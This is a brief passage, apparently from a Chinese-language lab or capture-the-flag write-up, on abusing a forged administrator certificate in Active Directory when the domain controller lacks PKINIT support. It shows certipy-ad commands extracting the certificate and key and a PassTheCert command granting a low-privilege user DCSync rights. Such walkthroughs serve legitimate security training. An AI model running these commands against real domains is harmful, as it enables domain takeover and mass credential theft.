```

```

![image-20250109171515703](https://files.seeusercontent.com/2026/04/08/a6tZ/image-20250109171515703.png)

报错，原因是DC不支持PKINIT，参考阅读：https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html?ref=7ms.us，授予低权限用户 DCSync 权限

```
certipy-ad cert -pfx administrator_forged.pfx -nokey -out administrator.crt
certipy-ad cert -pfx administrator_forged.pfx -nocert -out administrator.key
```

![image-20250109171639486](https://files.seeusercontent.com/2026/04/08/0jUe/image-20250109171639486.png)

python3 /home/zkpc/Tools/PassTheCert/Python/passthecert.py -action modify_user -crt administrator.crt -key administrator.key -target kelly.hill -elevate -domain push.vl -dc-host dc01.push.vl
